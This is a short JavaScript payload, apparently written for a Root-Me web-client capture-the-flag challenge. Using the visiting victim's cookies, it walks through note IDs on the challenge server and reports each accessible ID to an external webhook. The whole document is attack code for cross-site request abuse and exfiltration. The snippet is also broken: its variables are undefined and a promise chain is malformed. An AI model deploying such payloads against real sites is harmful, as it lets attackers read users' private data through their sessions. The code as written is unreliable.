<script>

const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";

let current = START_ID;
let active = false;
let found = false;

function tryId(i) {
    fetch(TARGET + i, {
        credentials: 'include'
    })
    .then(res => {
        if (res.ok) {
            fetch(WEBHOOK + "?admin=" + i);
            return;
        }
        return res.text(); 
    })

        if (data) {
            tryId(i + 1);
        }
    })
    .catch(() => {
        fetch(WEBHOOK + "?admin=" + i);
    });
}
